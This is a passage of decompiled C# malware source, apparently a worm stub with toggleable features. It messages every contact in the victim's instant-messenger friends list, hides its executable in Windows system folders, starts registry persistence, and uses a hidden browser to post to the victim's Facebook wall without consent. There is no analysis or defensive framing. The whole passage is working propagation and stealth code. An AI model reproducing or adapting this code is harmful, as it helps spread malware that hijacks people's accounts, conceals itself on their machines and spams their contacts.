      NewLateBinding.LateCall(NewLateBinding.LateGet(objectValue1, (System.Type) null, "Client", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "Start", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      NewLateBinding.LateCall(objectValue1, (System.Type) null, "Attach", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      try
      {
        foreach (object obj in (IEnumerable) NewLateBinding.LateGet(objectValue1, (System.Type) null, "Friends", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null))
        {
          object objectValue2 = RuntimeHelpers.GetObjectValue(obj);
          object Instance1 = objectValue1;
          object[] objArray1 = new object[2];
          object[] objArray2 = objArray1;
          object Instance2 = objectValue2;
          object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Instance2, (System.Type) null, "Handle", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
          objArray2[0] = objectValue3;
          object[] objArray3 = objArray1;
          TextBox textBox15 = this.TextBox15;
          string text = textBox15.Text;
          objArray3[1] = (object) text;
          object[] objArray4 = objArray1;
          object[] Arguments = objArray4;
          bool[] flagArray = new bool[2]{ true, true };
          bool[] CopyBack = flagArray;
          NewLateBinding.LateCall(Instance1, (System.Type) null, "SendMessage", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
          if (flagArray[0])
            NewLateBinding.LateSetComplex(Instance2, (System.Type) null, "Handle", new object[1]
            {
              RuntimeHelpers.GetObjectValue(objArray4[0])
            }, (string[]) null, (System.Type[]) null, true, false);
          if (flagArray[1])
            textBox15.Text = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray4[1]), typeof (string));
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }

    public void CacherFichier()
    {
      if (Operators.CompareString(this.TextBox19.Text, "1", false) != 0)
        return;
      if (Operators.CompareString(this.TextBox7.Text, "1", false) == 0)
      {
        try
        {
          new FileInfo("C:\\Windows\\" + this.TextBox5.Text + ".exe").Attributes = FileAttributes.Hidden;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(this.TextBox6.Text, "1", false) == 0)
      {
        try
        {
          new FileInfo("C:\\Windows\\Temp\\" + this.TextBox5.Text + ".exe").Attributes = FileAttributes.Hidden;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(this.TextBox8.Text, "1", false) != 0)
        return;
      try
      {
        new FileInfo("C:\\Windows\\System32\\" + this.TextBox5.Text + ".exe").Attributes = FileAttributes.Hidden;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void persit()
    {
      if (Operators.CompareString(this.TextBox21.Text, "1", false) != 0)
        return;
      new Thread(new ThreadStart(RegPersistence.Persistence)).Start();
    }

    public void FBWall(string message)
    {
      if (Operators.CompareString(this.TextBox26.Text, "1", false) != 0)
        return;
      try
      {
        WebBrowser webBrowser = new WebBrowser();
        webBrowser.Navigate("http://m.facebook.com/home.php?");
        while (webBrowser.ReadyState != WebBrowserReadyState.Complete)
          Application.DoEvents();
        try
        {
          foreach (HtmlElement htmlElement in webBrowser.Document.All)
          {
            if (Operators.CompareString(htmlElement.GetAttribute("name"), "status", false) == 0)
              htmlElement.SetAttribute("value", message);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
        try
        {
          foreach (HtmlElement htmlElement in webBrowser.Document.All)
          {
            if (Operators.CompareString(htmlElement.GetAttribute("name"), "update", false) == 0)
              htmlElement.InvokeMember("click");
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
